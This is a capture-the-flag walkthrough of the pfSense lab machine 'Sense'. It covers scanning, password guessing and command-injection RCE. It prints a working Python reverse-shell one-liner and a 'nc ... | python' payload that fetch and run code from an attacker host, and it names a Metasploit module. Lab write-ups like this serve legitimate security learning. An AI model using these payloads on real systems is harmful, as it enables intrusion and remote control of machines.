## Sense

Difficulty: Easy

### User and Root Flag

```
rustscan -a 10.10.10.60 --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/224077894-c0458f7d-d098-49ed-8104-eb5fa103a48f.png)

<br>

The website is a pfsense portal. Default credentials doesn't work here.

![portal](https://user-images.githubusercontent.com/58514930/224079736-ed0e4be3-91e8-4756-8337-26d68b49c75b.png)

<br>

Running gobuster we find 2 txt.

```
gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt -k
```

![gobuster](https://user-images.githubusercontent.com/58514930/224079046-bc633672-908e-4bae-8d43-4c5a46bd0d78.png)

<br>

In system-users.txt we enumerate a user called rohit.

![system-users](https://user-images.githubusercontent.com/58514930/224079999-c3c8d8f0-12ca-4b41-bd72-eeb0ff8f12fe.png)

<br>

Trying some common password, we discover that the credential is: rohit:pfsense.

![adminPanel](https://user-images.githubusercontent.com/58514930/224080598-34097323-4edc-4767-8487-96e1c1c521bb.png)

<br>

Searching for pfsense vulnerabilities, the "Command Injection in status_rrd_graph_img.php" described in [this link](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/) seems to work.

### Manual Exploit

First we open the graph image and intercept the request to get the URL.

![openingImage](https://user-images.githubusercontent.com/58514930/224081556-b51d8b22-6382-4edc-a5c1-de2a2b8df3a4.png)

<br>

We just echo "whoami" command to test the RCE.

![testingRequest](https://user-images.githubusercontent.com/58514930/224081854-66f56584-92c8-4a0d-866e-47fa1194743a.png)

![testingResponse](https://user-images.githubusercontent.com/58514930/224082206-94922f7b-4bef-4bc3-b7ea-7ec29a39f6a6.png)

<br>

To get a reverse shell, we create a file called "shell" with a python reverse.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Now we put a listener redirecting the file with:

```
nc -lvnp 9001 < shell
```

Sequentially, we get this file doing the nc connection and pipe it to python, so our RCE payload will be:

```
nc 10.10.14.8 9001 | python
nc+10.10.14.8+9001+|+python --> converted to URL
```

![requestReverseShell](https://user-images.githubusercontent.com/58514930/224082580-f08ac684-0a38-48a9-9f76-f292ffd30d72.png)

![getReverseShell](https://user-images.githubusercontent.com/58514930/224082607-e0c5f7b0-9a0c-4292-9c31-a9aed567fb78.png)

### Automatic Exploit

Use this exploit in metasploit: exploit/unix/http/pfsense_graph_injection_exec.

![metasploit](https://user-images.githubusercontent.com/58514930/224083502-b37004ca-55a0-4543-a03c-f71457835a1d.png)
